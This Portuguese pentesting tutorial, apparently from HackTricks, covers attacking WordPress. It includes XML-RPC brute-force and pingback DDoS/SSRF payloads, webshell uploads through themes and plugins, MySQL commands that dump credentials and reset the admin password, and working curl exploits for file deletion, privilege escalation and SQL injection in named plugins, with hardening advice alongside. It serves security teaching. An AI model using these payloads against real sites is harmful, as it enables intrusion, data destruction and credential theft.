# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Informa√ß√µes B√°sicas

- **Arquivos enviados** v√£o para: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Os arquivos de temas podem ser encontrados em /wp-content/themes/,** ent√£o se voc√™ alterar algum php do tema para obter RCE, provavelmente usar√° esse caminho. Por exemplo: Usando **o tema twentytwelve** voc√™ pode **acessar** o arquivo **404.php** em: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Outra URL √∫til pode ser:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- No **wp-config.php** voc√™ pode encontrar a senha root do banco de dados.
- Caminhos de login padr√£o para verificar: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Principais Arquivos do WordPress**

- `index.php`
- `license.txt` cont√©m informa√ß√µes √∫teis, como a vers√£o do WordPress instalada.
- `wp-activate.php` √© usado para o processo de ativa√ß√£o por e-mail ao configurar um novo site WordPress.
- Pastas de login (podem ser renomeadas para ocult√°-las):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` √© um arquivo que representa um recurso do WordPress que permite que dados sejam transmitidos com HTTP atuando como o mecanismo de transporte e XML como o mecanismo de codifica√ß√£o. Esse tipo de comunica√ß√£o foi substitu√≠do pela [REST API](https://developer.wordpress.org/rest-api/reference) do WordPress.
- A pasta `wp-content` √© o diret√≥rio principal onde plugins e temas s√£o armazenados.
- `wp-content/uploads/` √© o diret√≥rio onde quaisquer arquivos enviados para a plataforma s√£o armazenados.
- `wp-includes/` Este √© o diret√≥rio onde arquivos principais s√£o armazenados, como certificados, fontes, arquivos JavaScript e widgets.
- `wp-sitemap.xml` Nas vers√µes do WordPress 5.5 e superiores, o WordPress gera um arquivo XML de sitemap com todas as postagens p√∫blicas e tipos de postagens e taxonomias publicamente consult√°veis.

**P√≥s-explora√ß√£o**

- O arquivo `wp-config.php` cont√©m informa√ß√µes necess√°rias para o WordPress se conectar ao banco de dados, como o nome do banco de dados, host do banco de dados, nome de usu√°rio e senha, chaves de autentica√ß√£o e sais, e o prefixo da tabela do banco de dados. Este arquivo de configura√ß√£o tamb√©m pode ser usado para ativar o modo DEBUG, que pode ser √∫til na solu√ß√£o de problemas.

### Permiss√µes de Usu√°rios

- **Administrador**
- **Editor**: Publica e gerencia suas postagens e as de outros
- **Autor**: Publica e gerencia suas pr√≥prias postagens
- **Colaborador**: Escreve e gerencia suas postagens, mas n√£o pode public√°-las
- **Assinante**: Navega pelas postagens e edita seu perfil

## **Enumera√ß√£o Passiva**

### **Obter vers√£o do WordPress**

Verifique se voc√™ pode encontrar os arquivos `/license.txt` ou `/readme.html`

Dentro do **c√≥digo-fonte** da p√°gina (exemplo de [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Arquivos de link CSS

![](<../../images/image (533).png>)

- Arquivos JavaScript

### Obter Plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Obter Temas
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extrair vers√µes em geral
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Enumera√ß√£o ativa

### Plugins e Temas

Voc√™ provavelmente n√£o conseguir√° encontrar todos os Plugins e Temas poss√≠veis. Para descobrir todos eles, voc√™ precisar√° **for√ßar ativamente uma lista de Plugins e Temas** (esperan√ßosamente para n√≥s, existem ferramentas automatizadas que cont√™m essas listas).

### Usu√°rios

- **ID Brute:** Voc√™ obt√©m usu√°rios v√°lidos de um site WordPress for√ßando IDs de usu√°rios:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Se as respostas forem **200** ou **30X**, isso significa que o id √© **v√°lido**. Se a resposta for **400**, ent√£o o id √© **inv√°lido**.

- **wp-json:** Voc√™ tamb√©m pode tentar obter informa√ß√µes sobre os usu√°rios fazendo consultas:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Outro endpoint `/wp-json/` que pode revelar algumas informa√ß√µes sobre os usu√°rios √©:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note que este endpoint exp√µe apenas usu√°rios que fizeram uma postagem. **Somente informa√ß√µes sobre os usu√°rios que t√™m esse recurso ativado ser√£o fornecidas**.

Tamb√©m note que **/wp-json/wp/v2/pages** pode vazar endere√ßos IP.

- **Enumera√ß√£o de nomes de usu√°rio de login**: Ao fazer login em **`/wp-login.php`**, a **mensagem** √© **diferente** se o **nome de usu√°rio existe ou n√£o**.

### XML-RPC

Se `xml-rpc.php` estiver ativo, voc√™ pode realizar um ataque de for√ßa bruta de credenciais ou us√°-lo para lan√ßar ataques DoS a outros recursos. (Voc√™ pode automatizar esse processo[ usando isso](https://github.com/relarizky/wpxploit) por exemplo).

Para ver se est√° ativo, tente acessar _**/xmlrpc.php**_ e envie esta solicita√ß√£o:

**Verificar**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**For√ßa Bruta de Credenciais**

**`wp.getUserBlogs`**, **`wp.getCategories`** ou **`metaWeblog.getUsersBlogs`** s√£o alguns dos m√©todos que podem ser usados para for√ßar credenciais. Se voc√™ conseguir encontrar algum deles, pode enviar algo como:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
A mensagem _"Nome de usu√°rio ou senha incorretos"_ dentro de uma resposta com c√≥digo 200 deve aparecer se as credenciais n√£o forem v√°lidas.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Usando as credenciais corretas, voc√™ pode fazer o upload de um arquivo. Na resposta, o caminho aparecer√° ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Tamb√©m h√° uma **maneira mais r√°pida** de for√ßar credenciais usando **`system.multicall`**, pois voc√™ pode tentar v√°rias credenciais na mesma solicita√ß√£o:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Este m√©todo √© destinado a programas e n√£o a humanos, e √© antigo, portanto n√£o suporta 2FA. Assim, se voc√™ tiver credenciais v√°lidas, mas a entrada principal estiver protegida por 2FA, **voc√™ pode conseguir abusar do xmlrpc.php para fazer login com essas credenciais contornando o 2FA**. Note que voc√™ n√£o poder√° realizar todas as a√ß√µes que pode fazer atrav√©s do console, mas ainda pode conseguir chegar ao RCE, como Ippsec explica em [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS ou varredura de portas**

Se voc√™ conseguir encontrar o m√©todo _**pingback.ping**_ na lista, pode fazer o Wordpress enviar uma solicita√ß√£o arbitr√°ria para qualquer host/porta.\
Isso pode ser usado para pedir **milhares** de **sites** Wordpress para **acessar** uma **localiza√ß√£o** (causando assim um **DDoS** nessa localiza√ß√£o) ou voc√™ pode us√°-lo para fazer o **Wordpress** **escanear** alguma **rede** interna (voc√™ pode indicar qualquer porta).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Se voc√™ receber **faultCode** com um valor **maior** que **0** (17), isso significa que a porta est√° aberta.

D√™ uma olhada no uso de **`system.multicall`** na se√ß√£o anterior para aprender como abusar desse m√©todo para causar DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Este arquivo geralmente existe na raiz do site Wordpress: **`/wp-cron.php`**\
Quando este arquivo √© **acessado**, uma **consulta** MySQL "**pesada**" √© realizada, podendo ser usado por **atacantes** para **causar** um **DoS**.\
Al√©m disso, por padr√£o, o `wp-cron.php` √© chamado em cada carregamento de p√°gina (sempre que um cliente solicita qualquer p√°gina do Wordpress), o que em sites de alto tr√°fego pode causar problemas (DoS).

Recomenda-se desativar o Wp-Cron e criar um cronjob real dentro do host que execute as a√ß√µes necess√°rias em um intervalo regular (sem causar problemas).

### /wp-json/oembed/1.0/proxy - SSRF

Tente acessar _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ e o site Wordpress pode fazer uma solicita√ß√£o para voc√™.

Esta √© a resposta quando n√£o funciona:

![](<../../images/image (365).png>)

## SSRF

{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Esta ferramenta verifica se o **methodName: pingback.ping** e para o caminho **/wp-json/oembed/1.0/proxy** e, se existir, tenta explor√°-los.

## Ferramentas Autom√°ticas
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Obter acesso sobrescrevendo um bit

Mais do que um ataque real, isso √© uma curiosidade. NO CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) voc√™ poderia inverter 1 bit de qualquer arquivo do wordpress. Assim, voc√™ poderia inverter a posi√ß√£o `5389` do arquivo `/var/www/html/wp-includes/user.php` para NOP a opera√ß√£o NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Painel RCE**

**Modificando um php do tema utilizado (credenciais de administrador necess√°rias)**

Apar√™ncia ‚Üí Editor de Tema ‚Üí Template 404 (√† direita)

Altere o conte√∫do para um shell php:

![](<../../images/image (384).png>)

Pesquise na internet como voc√™ pode acessar essa p√°gina atualizada. Neste caso, voc√™ deve acessar aqui: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Voc√™ pode usar:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
para obter uma sess√£o.

## Plugin RCE

### Plugin PHP

Pode ser poss√≠vel fazer upload de arquivos .php como um plugin.\
Crie seu backdoor em php usando, por exemplo:

![](<../../images/image (183).png>)

Em seguida, adicione um novo plugin:

![](<../../images/image (722).png>)

Fa√ßa o upload do plugin e pressione Instalar Agora:

![](<../../images/image (249).png>)

Clique em Procced:

![](<../../images/image (70).png>)

Provavelmente isso n√£o far√° nada aparentemente, mas se voc√™ for para M√≠dia, ver√° seu shell carregado:

![](<../../images/image (462).png>)

Acesse-o e voc√™ ver√° a URL para executar o shell reverso:

![](<../../images/image (1006).png>)

### Carregando e ativando plugin malicioso

Este m√©todo envolve a instala√ß√£o de um plugin malicioso conhecido por ser vulner√°vel e pode ser explorado para obter um web shell. Este processo √© realizado atrav√©s do painel do WordPress da seguinte forma:

1. **Aquisi√ß√£o do Plugin**: O plugin √© obtido de uma fonte como o Exploit DB como [**aqui**](https://www.exploit-db.com/exploits/36374).
2. **Instala√ß√£o do Plugin**:
- Navegue at√© o painel do WordPress, em seguida v√° para `Painel > Plugins > Carregar Plugin`.
- Fa√ßa o upload do arquivo zip do plugin baixado.
3. **Ativa√ß√£o do Plugin**: Uma vez que o plugin esteja instalado com sucesso, ele deve ser ativado atrav√©s do painel.
4. **Explora√ß√£o**:
- Com o plugin "reflex-gallery" instalado e ativado, ele pode ser explorado, pois √© conhecido por ser vulner√°vel.
- O framework Metasploit fornece um exploit para essa vulnerabilidade. Carregando o m√≥dulo apropriado e executando comandos espec√≠ficos, uma sess√£o meterpreter pode ser estabelecida, concedendo acesso n√£o autorizado ao site.
- Observa-se que este √© apenas um dos muitos m√©todos para explorar um site WordPress.

O conte√∫do inclui aux√≠lios visuais que retratam os passos no painel do WordPress para instalar e ativar o plugin. No entanto, √© importante notar que explorar vulnerabilidades dessa maneira √© ilegal e anti√©tico sem a devida autoriza√ß√£o. Essas informa√ß√µes devem ser usadas de forma respons√°vel e apenas em um contexto legal, como testes de penetra√ß√£o com permiss√£o expl√≠cita.

**Para passos mais detalhados, confira:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## De XSS a RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ √© um script projetado para escalar uma **vulnerabilidade de Cross-Site Scripting (XSS)** para **Execu√ß√£o Remota de C√≥digo (RCE)** ou outras vulnerabilidades cr√≠ticas no WordPress. Para mais informa√ß√µes, confira [**este post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Ele fornece **suporte para vers√µes do WordPress 6.X.X, 5.X.X e 4.X.X e permite:**
- _**Escala√ß√£o de Privil√©gios:**_ Cria um usu√°rio no WordPress.
- _**(RCE) Upload de Plugin Personalizado (backdoor):**_ Fa√ßa o upload do seu plugin personalizado (backdoor) para o WordPress.
- _**(RCE) Edi√ß√£o de Plugin Integrado:**_ Edite Plugins Integrados no WordPress.
- _**(RCE) Edi√ß√£o de Tema Integrado:**_ Edite Temas Integrados no WordPress.
- _**(Personalizado) Exploits Personalizados:**_ Exploits Personalizados para Plugins/Temas de Terceiros do WordPress.

## P√≥s Explora√ß√£o

Extraia nomes de usu√°rios e senhas:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Alterar a senha do administrador:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Superf√≠cie de Ataque

Saber como um plugin do Wordpress pode expor funcionalidades √© fundamental para encontrar vulnerabilidades em sua funcionalidade. Voc√™ pode descobrir como um plugin pode expor funcionalidades nos seguintes pontos e alguns exemplos de plugins vulner√°veis em [**este post do blog**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Uma das maneiras que um plugin pode expor fun√ß√µes para os usu√°rios √© atrav√©s de manipuladores AJAX. Estes podem conter bugs de l√≥gica, autoriza√ß√£o ou autentica√ß√£o. Al√©m disso, √© bastante comum que essas fun√ß√µes baseiem tanto a autentica√ß√£o quanto a autoriza√ß√£o na exist√™ncia de um nonce do Wordpress que **qualquer usu√°rio autenticado na inst√¢ncia do Wordpress pode ter** (independentemente de seu papel).

Estas s√£o as fun√ß√µes que podem ser usadas para expor uma fun√ß√£o em um plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**O uso de `nopriv` torna o endpoint acess√≠vel a qualquer usu√°rio (mesmo os n√£o autenticados).**

> [!CAUTION]
> Al√©m disso, se a fun√ß√£o estiver apenas verificando a autoriza√ß√£o do usu√°rio com a fun√ß√£o `wp_verify_nonce`, essa fun√ß√£o est√° apenas verificando se o usu√°rio est√° logado, geralmente n√£o est√° verificando o papel do usu√°rio. Assim, usu√°rios com baixos privil√©gios podem ter acesso a a√ß√µes de altos privil√©gios.

- **REST API**

Tamb√©m √© poss√≠vel expor fun√ß√µes do WordPress registrando uma API REST usando a fun√ß√£o `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
O `permission_callback` √© um callback para uma fun√ß√£o que verifica se um determinado usu√°rio est√° autorizado a chamar o m√©todo da API.

**Se a fun√ß√£o embutida `__return_true` for usada, ela simplesmente ignorar√° a verifica√ß√£o de permiss√µes do usu√°rio.**

- **Acesso direto ao arquivo php**

Claro, o Wordpress usa PHP e os arquivos dentro dos plugins s√£o acess√≠veis diretamente pela web. Assim, caso um plugin esteja expondo alguma funcionalidade vulner√°vel que √© acionada apenas acessando o arquivo, ele ser√° explor√°vel por qualquer usu√°rio.

### Exclus√£o Arbitr√°ria de Arquivos N√£o Autenticada via wp_ajax_nopriv (Tema Litho <= 3.0)

Os temas e plugins do WordPress frequentemente exp√µem manipuladores AJAX atrav√©s dos hooks `wp_ajax_` e `wp_ajax_nopriv_`. Quando a variante **_nopriv_** √© usada **o callback se torna acess√≠vel por visitantes n√£o autenticados**, ent√£o qualquer a√ß√£o sens√≠vel deve implementar adicionalmente:

1. Uma **verifica√ß√£o de capacidade** (por exemplo, `current_user_can()` ou pelo menos `is_user_logged_in()`), e
2. Um **nonce CSRF** validado com `check_ajax_referer()` / `wp_verify_nonce()`, e
3. **Sanitiza√ß√£o / valida√ß√£o rigorosa de entrada**.

O tema multiprop√≥sito Litho (< 3.1) esqueceu esses 3 controles na funcionalidade *Remover Fam√≠lia de Fonte* e acabou enviando o seguinte c√≥digo (simplificado):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemas introduzidos por este trecho:

* **Acesso n√£o autenticado** ‚Äì o gancho `wp_ajax_nopriv_` est√° registrado.
* **Sem verifica√ß√£o de nonce / capacidade** ‚Äì qualquer visitante pode acessar o endpoint.
* **Sem sanitiza√ß√£o de caminho** ‚Äì a string `fontfamily` controlada pelo usu√°rio √© concatenada a um caminho de sistema de arquivos sem filtragem, permitindo a cl√°ssica travessia `../../`.

#### Explora√ß√£o

Um atacante pode deletar qualquer arquivo ou diret√≥rio **abaixo do diret√≥rio base de uploads** (normalmente `<wp-root>/wp-content/uploads/`) enviando uma √∫nica solicita√ß√£o HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Porque `wp-config.php` est√° fora de *uploads*, quatro sequ√™ncias de `../` s√£o suficientes em uma instala√ß√£o padr√£o. Deletar `wp-config.php` for√ßa o WordPress a entrar no *assistente de instala√ß√£o* na pr√≥xima visita, permitindo uma tomada total do site (o atacante apenas fornece uma nova configura√ß√£o de DB e cria um usu√°rio admin).

Outros alvos impactantes incluem arquivos `.php` de plugins/temas (para quebrar plugins de seguran√ßa) ou regras de `.htaccess`.

#### Lista de verifica√ß√£o de detec√ß√£o

* Qualquer callback `add_action( 'wp_ajax_nopriv_...')` que chama helpers de sistema de arquivos (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatena√ß√£o de entrada de usu√°rio n√£o sanitizada em caminhos (procure por `$_POST`, `$_GET`, `$_REQUEST`).
* Aus√™ncia de `check_ajax_referer()` e `current_user_can()`/`is_user_logged_in()`.

#### Fortalecimento
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// ‚Ä¶ proceed ‚Ä¶
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  üîí  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Sempre** trate qualquer opera√ß√£o de escrita/exclus√£o no disco como privilegiada e verifique duas vezes:
> ‚Ä¢ Autentica√ß√£o  ‚Ä¢ Autoriza√ß√£o  ‚Ä¢ Nonce  ‚Ä¢ Sanitiza√ß√£o de entrada  ‚Ä¢ Conten√ß√£o de caminho (por exemplo, via `realpath()` mais `str_starts_with()`).

---

### Escalada de privil√©gio via restaura√ß√£o de fun√ß√£o obsoleta e autoriza√ß√£o ausente (ASE "Ver Admin como Fun√ß√£o")

Muitos plugins implementam um recurso de "ver como fun√ß√£o" ou troca tempor√°ria de fun√ß√£o salvando a(s) fun√ß√£o(√µes) original(is) na meta do usu√°rio para que possam ser restauradas posteriormente. Se o caminho de restaura√ß√£o depender apenas de par√¢metros de solicita√ß√£o (por exemplo, `$_REQUEST['reset-for']`) e uma lista mantida pelo plugin sem verificar capacidades e um nonce v√°lido, isso se torna uma escalada de privil√©gio vertical.

Um exemplo do mundo real foi encontrado no plugin Admin and Site Enhancements (ASE) (‚â§ 7.6.2.1). O ramo de redefini√ß√£o restaurou fun√ß√µes com base em `reset-for=<username>` se o nome de usu√°rio aparecesse em um array interno `$options['viewing_admin_as_role_are']`, mas n√£o realizou uma verifica√ß√£o `current_user_can()` nem uma verifica√ß√£o de nonce antes de remover as fun√ß√µes atuais e re-adicionar as fun√ß√µes salvas da meta do usu√°rio `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Por que √© explor√°vel

- Confia em `$_REQUEST['reset-for']` e em uma op√ß√£o de plugin sem autoriza√ß√£o do lado do servidor.
- Se um usu√°rio anteriormente tinha privil√©gios mais altos salvos em `_asenha_view_admin_as_original_roles` e foi rebaixado, ele pode restaur√°-los acessando o caminho de redefini√ß√£o.
- Em algumas implementa√ß√µes, qualquer usu√°rio autenticado poderia acionar uma redefini√ß√£o para outro nome de usu√°rio ainda presente em `viewing_admin_as_role_are` (autoriza√ß√£o quebrada).

Pr√©-requisitos do ataque

- Vers√£o vulner√°vel do plugin com o recurso habilitado.
- A conta alvo tem um papel de alto privil√©gio obsoleto armazenado nos metadados do usu√°rio de usos anteriores.
- Qualquer sess√£o autenticada; nonce/capacidade ausente no fluxo de redefini√ß√£o.

Explora√ß√£o (exemplo)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Em vers√µes vulner√°veis, isso remove os pap√©is atuais e re-adiciona os pap√©is originais salvos (por exemplo, `administrator`), efetivamente escalando privil√©gios.

Lista de verifica√ß√£o de detec√ß√£o

- Procure por recursos de troca de pap√©is que persistem ‚Äúpap√©is originais‚Äù na meta do usu√°rio (por exemplo, `_asenha_view_admin_as_original_roles`).
- Identifique caminhos de redefini√ß√£o/restaura√ß√£o que:
- Leiam nomes de usu√°rio de `$_REQUEST` / `$_GET` / `$_POST`.
- Modifiquem pap√©is via `add_role()` / `remove_role()` sem `current_user_can()` e `wp_verify_nonce()` / `check_admin_referer()`.
- Autorizem com base em um array de op√ß√µes de plugin (por exemplo, `viewing_admin_as_role_are`) em vez das capacidades do ator.

Fortalecimento

- Aplique verifica√ß√µes de capacidade em cada ramifica√ß√£o que altera o estado (por exemplo, `current_user_can('manage_options')` ou mais rigoroso).
- Exija nonces para todas as muta√ß√µes de papel/permiss√£o e verifique-os: `check_admin_referer()` / `wp_verify_nonce()`.
- Nunca confie em nomes de usu√°rio fornecidos pela solicita√ß√£o; resolva o usu√°rio alvo no lado do servidor com base no ator autenticado e na pol√≠tica expl√≠cita.
- Invalide o estado de ‚Äúpap√©is originais‚Äù em atualiza√ß√µes de perfil/papel para evitar restaura√ß√£o de privil√©gios altos obsoletos:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Considere armazenar um estado m√≠nimo e usar tokens tempor√°rios com capacidade limitada para mudan√ßas de fun√ß√£o.

---

## Prote√ß√£o do WordPress

### Atualiza√ß√µes Regulares

Certifique-se de que o WordPress, plugins e temas estejam atualizados. Tamb√©m confirme que a atualiza√ß√£o autom√°tica est√° habilitada em wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Tamb√©m, **instale apenas plugins e temas do WordPress confi√°veis**.

### Plugins de Seguran√ßa

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Outras Recomenda√ß√µes**

- Remova o usu√°rio **admin** padr√£o
- Use **senhas fortes** e **2FA**
- **Revise** periodicamente as **permiss√µes** dos usu√°rios
- **Limite tentativas de login** para prevenir ataques de For√ßa Bruta
- Renomeie o arquivo **`wp-admin.php`** e permita acesso apenas internamente ou de certos endere√ßos IP.

### Inje√ß√£o SQL n√£o autenticada via valida√ß√£o insuficiente (WP Job Portal <= 2.3.2)

O plugin de recrutamento WP Job Portal exp√¥s uma tarefa **savecategory** que, em √∫ltima inst√¢ncia, executa o seguinte c√≥digo vulner√°vel dentro de `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemas introduzidos por este trecho:

1. **Entrada do usu√°rio n√£o sanitizada** ‚Äì `parentid` vem diretamente da requisi√ß√£o HTTP.
2. **Concatena√ß√£o de strings dentro da cl√°usula WHERE** ‚Äì sem `is_numeric()` / `esc_sql()` / declara√ß√£o preparada.
3. **Acessibilidade n√£o autenticada** ‚Äì embora a a√ß√£o seja executada atrav√©s de `admin-post.php`, a √∫nica verifica√ß√£o em vigor √© um **nonce CSRF** (`wp_verify_nonce()`), que qualquer visitante pode recuperar de uma p√°gina p√∫blica que incorpora o shortcode `[wpjobportal_my_resumes]`.

#### Explora√ß√£o

1. Pegue um nonce fresco:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injete SQL arbitr√°rio abusando de `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
A resposta revela o resultado da consulta injetada ou altera o banco de dados, provando SQLi.

### Download de Arquivo Arbitr√°rio N√£o Autenticado / Traversal de Caminho (WP Job Portal <= 2.3.2)

Outra tarefa, **downloadcustomfile**, permitia que visitantes baixassem **qualquer arquivo no disco** via traversal de caminho. O ponto vulner√°vel est√° localizado em `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` √© controlado pelo atacante e concatenado **sem sanitiza√ß√£o**. Novamente, a √∫nica barreira √© um **CSRF nonce** que pode ser obtido na p√°gina de curr√≠culo.

#### Explora√ß√£o
```bash
